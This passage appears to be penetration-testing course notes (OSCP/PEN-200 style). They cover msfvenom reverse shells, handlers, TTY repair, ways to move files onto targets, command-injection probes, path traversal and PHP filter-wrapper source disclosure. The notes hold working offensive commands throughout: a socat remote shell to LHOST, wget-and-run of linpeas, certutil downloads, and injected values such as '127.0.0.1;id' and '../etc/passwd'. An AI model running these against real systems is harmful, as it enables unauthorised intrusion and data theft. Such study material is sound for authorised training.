A staged payload requires another transfer and a matching handler; Netcat may receive a stage request without producing a shell. ### 6. Execute and choose variants List rather than guess names and formats: ```bash msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options ``` Stageless command-shell binaries: ```bash msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe ``` Verify the resulting artifacts: ```bash file shell.elf shell.exe sha256sum shell.elf shell.exe ``` > `msfvenom` does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route. ##### Staged versus stageless ```text stageless: complete payload delivered at once; larger, usually simpler and more stable staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer ``` Metasploit naming commonly reflects the distinction: ```text windows/x64/shell_reverse_tcp stageless windows/x64/shell/reverse_tcp staged ``` A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs `multi/handler` configured with the exact same payload: ```text msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run ``` > A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution. ##### Existing-PoC payload constraints Only when an existing reviewed PoC documents payload space and bad characters: ```bash msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' \ -s MAX_SPACE ``` Encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list. ### 7. Worked example — hypothetical Observation: a payload connects to Netcat but produces unreadable/no commands. Test: inspect the exact staged payload name and pair its handler. Illustrative output: staging completes and the intended session appears. Interpretation: verify the identity and record the permitted framework context. ### 8. Verify the result Check artifact format/hash and actual session identity; generation success is not execution proof. ### 9. Failure and fallback Wrong architecture, stage/handler mismatch, missing second route or payload-space constraints require separate fixes. Encoding does not guarantee endpoint-control bypass. ### 10. Next transitions [Match an artifact to its executable consumer and runtime](execution.md#execution-format); [Pair staged payloads with the correct handler and session lifecycle](execution.md#execution-handler); [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ## Repair a limited Linux terminal **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/02-shells-and-payloads.md#stabilize-a-linux-tty) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result A usable terminal while preserving the existing identity. ### 2. Recognition clues A working shell lacks job control, terminal signals or interactive program support. #### Find the clue from your starting access **Where to investigate:** Inspect the working shell's terminal state and available PTY utilities after verifying a stable command channel. **Discovery action — reference example:** ```bash tty command -v python3 script socat ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text not a tty /usr/bin/python3 ``` **Recognize this detail:** A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists. **Still missing before method selection:** Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The supported PTY and local settings restore terminal behavior: use interactive tools in that same identity. | | Ruled out in this context | The channel drops before any command executes: reject terminal settings as the first fault. | | Inconclusive | No PTY utility found leaves alternative terminal methods/noninteractive use to investigate. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** A working channel and available PTY mechanism; correct local-terminal control sequence. ### 4. Discover and verify prerequisites ```bash tty command -v python3 script socat ``` ### 5. Why it works A socket-backed command stream is not automatically a terminal. A PTY and correct local raw/echo settings repair terminal behavior without changing privileges. ### 6. Execute and choose variants First obtain a PTY with an available interpreter: ```bash python3 -c 'import pty; pty.spawn("/bin/bash")' ``` Press `Ctrl-Z` locally, then: ```bash stty raw -echo; fg ``` Back in the remote shell: ```bash reset export TERM=xterm-256color stty rows 40 columns 120 ``` If the local terminal becomes unreadable, restore it from a separate/local shell: ```bash stty sane ``` Socat can provide a stronger PTY when present on both sides: ```bash # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr # Target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT ``` > TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one. ### 7. Worked example — hypothetical Observation: the shell runs commands but interactive sudo fails. Test: spawn a PTY and repair local terminal settings. Illustrative output: tty reports a device and the prompt behaves correctly. Interpretation: retry the legitimate interactive prerequisite check. ### 8. Verify the result Check tty, signal handling and an interactive program; confirm the same identity remains. ### 9. Failure and fallback A dropped connection is not solved by terminal settings. If no PTY mechanism exists, use noninteractive commands or an authenticated terminal method. ### 10. Next transitions [Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo); [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state); [Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh). ## Transfer over HTTP using Linux or Windows clients **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md#linux-target-pull-linpeas-from-kali-over-http) | [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md#verify-the-transfer) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result A downloaded file whose destination bytes can be verified. ### 2. Recognition clues A tool/artifact must reach a target that can make an HTTP request. #### Find the clue from your starting access **Where to investigate:** From the target's command context inspect downloader availability, writable destination and a route to the fixed served directory. **Discovery action — reference example:** ```bash command -v curl wget ls -ld /tmp ip route get LHOST ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text /usr/bin/curl /tmp: writable to current user LHOST via GATEWAY dev INTERFACE ``` **Recognize this detail:** A downloader, destination and plausible outbound path enable an HTTP transfer candidate. **Still missing before method selection:** Check actual server bind/directory, HTTP request/response and source/destination hashes. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The requested file is retrieved and its bytes match: use the verified copy. | | Ruled out in this context | No permitted target-to-server route exists: reject this HTTP pull direction. | | Inconclusive | A route without a logged request leaves bind/firewall/DNS unresolved. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** Correct server bind and served directory; target-to-server route, available downloader and writable destination. ### 4. Discover and verify prerequisites ```bash python3 -m http.server 8000 --bind LHOST --directory /PATH/TO/FILES ``` ### 5. Why it works The target is the HTTP client even when the assessment host started the operation. A 404 is a server-path problem; no request is a different boundary from successful download with incompatible execution. ### 6. Execute and choose variants On Kali, serve the directory containing `linpeas.sh`: ```bash cd /path/to/tools python3 -m http.server 8000 --bind 0.0.0.0 ``` On the Linux target, download into a writable directory and run it: ```bash wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt ``` > **Read:** Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.
HTTP variants — fixed server directory, curl, Windows and alternate built-ins ##### Serve a fixed directory without changing folders ```bash python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools ``` Python's simple server supplies downloads over unencrypted HTTP. Stop it with `Ctrl+C` when finished. ##### Linux target with curl ```bash curl -fL http://LHOST:8000/FILE -o /tmp/FILE ``` `-f` reports HTTP errors and `-L` follows redirects. Use a writable destination. ##### Windows target with PowerShell Run inside PowerShell: ```powershell Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE" ``` From `cmd.exe`, invoke PowerShell explicitly: ```cmd powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'" ``` ##### Windows alternatives ```powershell (New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE') ``` ```cmd curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE ``` ```cmd certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE ``` Availability and policy can differ by host. `certutil` may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.
Compare the source and destination hashes. On Kali or Linux: ```bash sha256sum FILE sha256sum /tmp/FILE ``` On Windows: ```powershell Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE" ``` > **Decisive output:** matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not. ### 7. Worked example — hypothetical Observation: a download reports success but the tool fails. Test: compare source/destination SHA-256 before execution. Illustrative output: hashes differ and the destination contains an error page. Interpretation: correct the HTTP path and repeat the transfer. ### 8. Verify the result Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions. ### 9. Failure and fallback No request: route/bind/egress. 404: path/name. Matching file but no execution: interpreter/format/control. Diagnose each separately. ### 10. Next transitions [Match an artifact to its executable consumer and runtime](execution.md#execution-format); [Use enumeration tools to generate manually testable candidates](linux-privesc.md#linux-enumerators); [Turn automated Windows findings into manually verified candidates](windows-privesc.md#windows-enumerators); [Move Windows files through an authenticated SMB share](sessions-transfers.md#transfer-smb); [Stream a file over a direct TCP connection](sessions-transfers.md#transfer-stream); [Move a small artifact through a text-only channel](sessions-transfers.md#transfer-text); [Use a temporary FTP transfer as a constrained fallback](sessions-transfers.md#transfer-ftp). ## Copy files through an authenticated SSH service **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result An authenticated file copy with verified bytes. ### 2. Recognition clues An SSH identity can access the needed source/destination. #### Find the clue from your starting access **Where to investigate:** Use established SSH context to identify allowed file/subsystem access and the intended remote destination's rights. **Discovery action — reference example:** ```bash ssh -v -p PORT USER@TARGET ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Authenticated using publickey Session/subsystem policy: inspect before transfer ``` **Recognize this detail:** SSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write. **Still missing before method selection:** Validate client/server subsystem compatibility, source read and destination write; inspect resulting bytes. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The supported copy mode writes the intended file and hashes match: use SCP. | | Ruled out in this context | The destination is unwritable: reject that path while retaining SCP to a permitted directory. | | Inconclusive | Accepted SSH without subsystem evidence leaves transfer behavior unknown. | **If you do not yet have this clue:** start with [Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility. ### 4. Discover and verify prerequisites ```bash ssh -p PORT -i KEY USER@TARGET ``` ### 5. Why it works SCP uses SSH authentication but filesystem rights remain independent. Modern clients may use the SFTP subsystem; a restricted service can allow one access form and deny another. ### 6. Execute and choose variants
SCP — copy through an authenticated SSH service ##### Kali to a Linux target ```bash scp FILE USER@TARGET:/tmp/FILE ``` ##### Linux target to Kali Run from Kali when the target's SSH service is reachable: ```bash scp USER@TARGET:/path/to/FILE ./FILE ``` ##### SSH key or nonstandard port ```bash scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE ``` `scp` uses uppercase `-P` for the SSH port. Authentication success does not guarantee write permission at the destination path.
### 7. Worked example — hypothetical Observation: SSH login succeeds but copying into an application directory fails. Test: copy to the user's writable temporary directory. Illustrative output: transfer completes and hashes match. Interpretation: destination authorization caused the original failure. ### 8. Verify the result Verify copied bytes and location; uppercase -P selects scp's SSH port. ### 9. Failure and fallback Authentication failure, missing subsystem and destination permission failure need different changes. Prefer a supported transfer method over guessing flags. ### 10. Next transitions [Match an artifact to its executable consumer and runtime](execution.md#execution-format); [Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http); [Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh). ## Move Windows files through an authenticated SMB share **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result A verified read/write transfer over the temporary share. ### 2. Recognition clues A Windows source can reach a temporary assessment-side SMB service. #### Find the clue from your starting access **Where to investigate:** From Windows inspect TCP/445 reachability to the deliberate transfer server and distinguish its share identity from target-domain credentials. **Discovery action — reference example:** ```powershell Test-NetConnection LHOST -Port 445 net use ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text TcpTestSucceeded : True Existing connection: \\LHOST\OTHER_SHARE as OTHER_USER ``` **Recognize this detail:** The service is reachable, but an existing connection can constrain a different credential context. **Still missing before method selection:** Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The intended authenticated share action succeeds and bytes match: use this transfer route. | | Ruled out in this context | Outbound SMB is blocked from this source: reject this direction, choosing another transport. | | Inconclusive | Transport alone does not settle cached-session identity or object rights. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection LHOST -Port 445 ``` ### 5. Why it works Share authentication belongs to the temporary server, not automatically the target domain. Existing Windows connections to the same server can conflict with another credential context. ### 6. Execute and choose variants
SMB — read and write files from Windows ##### Start an authenticated SMB share on Kali ```bash mkdir -p share sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' ``` The first positional value is the share name; the second is its local directory. The supplied `USER` and `PASSWORD` authenticate to this temporary Kali share. Some installations expose the legacy wrapper name: ```bash sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' ``` ##### Connect and download from Windows ```cmd net use \\LHOST\transfer /user:USER "PASSWORD" copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE ``` ##### Upload evidence from Windows to Kali ```cmd copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE net use \\LHOST\transfer /delete ``` Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's `-readonly` option.
### 7. Worked example — hypothetical Observation: HTTP is unavailable but outbound SMB is permitted. Test: connect to the authenticated share and copy one artifact. Illustrative output: copy succeeds and SHA-256 matches. Interpretation: use that transfer route and remove the created connection afterward. ### 8. Verify the result Verify source/destination hash and the share path; disconnect created mappings after use. ### 9. Failure and fallback No route, conflicting cached connection, invalid share credentials and denied filesystem writes are independent failure points. ### 10. Next transitions [Match an artifact to its executable consumer and runtime](execution.md#execution-format); [Turn automated Windows findings into manually verified candidates](windows-privesc.md#windows-enumerators); [Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http). ## Stream a file over a direct TCP connection **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result A byte stream saved as a file and independently checked for integrity. ### 2. Recognition clues Only a raw TCP tool and a direct or forwarded connection are available. #### Find the clue from your starting access **Where to investigate:** When richer transfers are unavailable, inspect the exact TCP tool and draw sender, receiver and writable output destination. **Discovery action — reference example:** ```bash nc -h ls -ld /DESTINATION_DIRECTORY ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Available client: Netcat implementation Direction: sender -> receiver listener Destination: writable ``` **Recognize this detail:** A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied. **Still missing before method selection:** Confirm listener syntax, reachability, binary-clean I/O and a complete independent hash match. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The chosen stream finishes with matching bytes: use the saved artifact. | | Ruled out in this context | The only available direction cannot reach the receiver: reject this stream route. | | Inconclusive | A connection with unknown termination/file size leaves transfer completeness unresolved. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file. ### 4. Discover and verify prerequisites ```bash nc -h ip route get TARGET ``` ### 5. Why it works A raw stream carries no filename, authentication or integrity metadata. Terminal output and connection termination can corrupt or truncate the saved file. ### 6. Execute and choose variants
Netcat — stream a file when a direct TCP connection is possible ##### Retrieve a file from the target to Kali Kali receives: ```bash nc -lvnp PORT > FILE ``` The target sends: ```bash nc -nv LHOST PORT < /path/to/FILE ``` ##### Send a file from Kali to the target The target receives: ```bash nc -lvnp PORT > /tmp/FILE ``` Kali sends: ```bash nc -nv TARGET PORT < FILE ``` If the listener rejects `-p`, use the OpenBSD-style form and check `nc -h` locally: ```bash nc -lvn PORT > FILE ``` Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.
### 7. Worked example — hypothetical Observation: a raw transfer connects but the saved artifact is shorter. Test: compare size/hash and inspect sender termination behavior. Illustrative output: a repeated clean transfer matches the source. Interpretation: only the matching copy is suitable for execution. ### 8. Verify the result Compare hashes and avoid mixing diagnostic text into the file stream. ### 9. Failure and fallback A connection without a complete hash match proves only transport. Use SCP/HTTP/SMB when those routes exist. ### 10. Next transitions [Match an artifact to its executable consumer and runtime](execution.md#execution-format); [Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http); [Relay a single TCP service through a fixed forward](pivoting.md#fixed-forward). ## Move a small artifact through a text-only channel **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result A reconstructed small file with matching bytes. ### 2. Recognition clues The existing command channel permits text but no convenient file-transfer connection. #### Find the clue from your starting access **Where to investigate:** Inspect the existing channel's command-length/quoting limits and whether both sides can reconstruct a small encoded file. **Discovery action — reference example:** ```bash command -v base64 wc -c FILE ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text /usr/bin/base64 SMALL_BYTE_COUNT FILE ``` **Recognize this detail:** A small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive. **Still missing before method selection:** Verify exact length/quoting and source/destination hash; use the Windows decoding variant when appropriate. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The complete decoded bytes match: use the text-transfer result. | | Ruled out in this context | The channel truncates below the required encoded size: reject a one-command transfer of this artifact. | | Inconclusive | Unknown command limits require a harmless small round trip before relying on the channel. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** Available Base64 encode/decode, adequate command length and a writable destination. ### 4. Discover and verify prerequisites ```bash base64 -w 0 FILE sha256sum FILE ``` ### 5. Why it works Base64 transports bytes through text; it does not encrypt them or guarantee that the command channel preserves length and quoting. ### 6. Execute and choose variants
Base64 — move a small file through a text-only channel ##### Encode on Linux ```bash base64 -w 0 FILE ``` ##### Decode on Linux ```bash printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE ``` ##### Decode in PowerShell ```powershell [IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA')) ``` Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.
### 7. Worked example — hypothetical Observation: a short configuration must cross a command-only channel. Test: encode, decode at the destination and compare hashes. Illustrative output: the hash matches. Interpretation: the byte transport succeeded; execution compatibility remains separate. ### 8. Verify the result Require a complete matching hash; keep encoded secrets in private evidence rather than reusable notes. ### 9. Failure and fallback Truncation, wrapping and quoting often corrupt long values. Use a network transfer for larger files. ### 10. Next transitions [Repair quoting, encoding and command-length boundaries](execution.md#execution-parser); [Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http); [Classify the artifact and its identity context](credentials.md#credential-classify). ## Use a temporary FTP transfer as a constrained fallback **Blocks:** 7; transfers support 5–14. [Operational procedure](../../reference/04-shells-transfers-credentials/01-file-transfer.md) | [Quick sheet](../../cheatsheets/shells-payloads.md) ### 1. Purpose and result A verified temporary FTP file transfer. ### 2. Recognition clues The target has an FTP client and simpler transfer routes are unavailable. #### Find the clue from your starting access **Where to investigate:** Inspect whether a compatible FTP client is the remaining route and whether the temporary server's data channel is reachable. **Discovery action — reference example:** ```text ftp help quit ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Client commands include: open, binary, get, put No transfer mode selected yet ``` **Recognize this detail:** Client availability permits investigating FTP; binary mode and separate data-channel paths remain necessary. **Still missing before method selection:** Verify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Binary transfer completes and hashes match: use that verified temporary copy. | | Ruled out in this context | Only the control channel works and the required data route is blocked: reject this FTP path. | | Inconclusive | Client presence alone leaves data transport and server rights unproved. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prerequisites **Starting access:** Verified command execution or authenticated remote access and a known network path. **Required conditions:** A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode. ### 4. Discover and verify prerequisites ```text ftp LHOST PORT binary ``` ### 5. Why it works FTP has separate control/data channels and can transform files in text mode. The temporary server's default permissions and authentication must be checked. ### 6. Execute and choose variants
Temporary FTP — only when an FTP client is the available route On Kali, after intentionally selecting/installing `pyftpdlib` in an isolated environment: ```bash python3 -m pyftpdlib -p PORT ``` On the target: ```text ftp LHOST PORT binary get FILE put FILE quit ``` The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.
### 7. Worked example — hypothetical Observation: a binary copied over FTP fails. Test: repeat in binary mode and compare hashes. Illustrative output: the second copy matches. Interpretation: transport mode, not payload generation, caused the failure. ### 8. Verify the result Compare bytes and stop the temporary server after its purpose is complete. ### 9. Failure and fallback A working control session with failed data transfer requires data-channel troubleshooting. Choose HTTP/SCP/SMB when available. ### 10. Next transitions [Match an artifact to its executable consumer and runtime](execution.md#execution-format); [Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http); [Copy files through an authenticated SSH service](sessions-transfers.md#transfer-scp). ## Sources and shared concepts Supplied PEN-200 command-to-shell pp257–259, Ch 19 selected PTY/forwarding examples and Ch 21 pp671–683. [Hexdump Linux shell resources](https://github.com/LeonardoE95/OSCP/tree/main/modules/linux), [Windows shell resources](https://github.com/LeonardoE95/OSCP/tree/main/modules/windows). Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

# Turn application weaknesses into access [Strategy map](../Attack_Strategy_Map.md) | [Master Notes](../Master_Notes.md) | [Operational index](../../README.md) | [Cheatsheets](../../cheatsheets/README.md) Prove the primitive first: file read, interpreted inclusion, write, query influence, authorization change or browser/server execution. Then validate the additional condition required to turn that primitive into useful access. **Speedrun blocks:** 4. **Documented methods:** 25. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. ## First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. ### Test the primitive exposed by the real request Use this command branch only when an input reaches a utility/command context. Match the observed OS/parser. ```bash curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH ``` - **If Target UID/name appears only in the test response:** Verify the destination and process identity; then choose a viable session route. → [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). - **If Only a repeatable controlled delay is visible:** Use the blind verification variants; one slow request proves nothing. → [Prove visible or blind operating-system command injection](web-exploitation.md#web-command). - **Otherwise:** Input is only reflected: investigate another mapped input or mechanism. → [Map parameters, API methods, objects and writable properties](web-mapping.md#web-parameters). ### For file inputs, prove actual file read Keep session and request method intact; choose a target file appropriate to the observed platform. ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` - **If Recognizable file contents:** Retrieve relevant application config/source; classify any recovered material. → [Classify the artifact and its identity context](credentials.md#credential-classify). - **If A PHP include sink accepts a filter wrapper:** Test source disclosure separately from file execution. → [Disclose PHP source through an inclusion wrapper](web-exploitation.md#web-php-source). - **Otherwise:** Only an error/template/status changed: return to request mapping; Recognition clues A download/path parameter or URL segment influences a local filename. #### Find the clue from your starting access **Where to investigate:** Find real download/preview/export requests in the behavior map; inspect which filename/path values the normal request accepts. **Discovery action — reference example:** ```bash curl -sk -b cookies.txt -D - 'http://TARGET:PORT/download?file=report.pdf' ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text GET /download?file=report.pdf Content-Disposition: attachment; filename=report.pdf Body: EXPECTED_REPORT_BYTES ``` **Recognize this detail:** An application-controlled file selection is the cue to test path confinement; it is not yet arbitrary read. **Still missing before method selection:** Request a known target-platform file through the real file parameter/path and compare with the normal response. Require recognizable file contents; a reflected filename, error or status change is not a read. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | A controlled out-of-directory request returns the intended target bytes: the traversal method is available. | | Ruled out in this context | An allowlist rejects paths and only serves approved report IDs: this path-selection context is not a traversal route. | | Inconclusive | An error mentioning a path shows influence but not read access; compare normal/control requests and permission/path depth. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file. ### 4. Discover and verify prerequisites ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` ### 5. Why it works Traversal changes path resolution. URL decoding, application normalization and curl path normalization are separate layers; readable bytes do not establish interpreted inclusion. ### 6. Execute and choose variants Linux proof: ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` Windows proof: ```bash curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH ``` > **Decisive output:** recognizable contents of the requested target file. `200 OK`, a changed template or a filename reflected in an error is not proof.
Variant — traversal occurs in the URL path ```bash curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' ``` `--path-as-is` prevents curl from collapsing `..` before sending the request.
Variant — basic normalization/filter tests ```text ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd ``` Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value.
> **Next:** use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context. ### 7. Worked example — hypothetical Observation: a download function accepts a filename. Test: request a recognizable system file with one controlled traversal. Illustrative output: expected account-file content. Interpretation: file read is confirmed; investigate relevant application configuration. ### 8. Verify the result Require recognizable target-file content and controls that exclude a reflected input or static error page. ### 9. Failure and fallback An empty/denied response can be path depth, normalization or file permissions. If only file read is proven, follow credentials instead of assuming code execution. ### 10. Recognition clues A PHP page/include parameter and possible access to local application files. #### Find the clue from your starting access **Where to investigate:** Inspect the normal page selector, PHP technology evidence and any readable source/configuration clue obtained during mapping. **Discovery action — reference example:** ```bash curl -sk -D - 'http://TARGET:PORT/index.php?page=about' ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Normal link: index.php?page=about Error for invalid page: include(PAGE.php): failed to open stream ``` **Recognize this detail:** An include-related error suggests an evaluating PHP sink, unlike an ordinary file-download function. **Still missing before method selection:** Verify that the actual sink accepts a filter wrapper and returns decodable target source; errors alone do not prove it. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The wrapper yields source that decodes correctly: use that source-disclosure method. | | Ruled out in this context | The endpoint reads raw bytes through a wrapper-incompatible API: reject this PHP-inclusion hypothesis. | | Inconclusive | PHP branding without sink evidence leaves inclusion unproved; investigate normal request/source behavior first. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** A PHP inclusion sink accepts the filter wrapper and the process can read the source. ### 4. Discover and verify prerequisites ```bash curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php ``` ### 5. Why it works The filter wrapper transforms file bytes before inclusion, allowing source disclosure instead of normal PHP evaluation. A generic file-download endpoint may not accept the same wrapper. ### 6. Execute and choose variants ```bash curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php 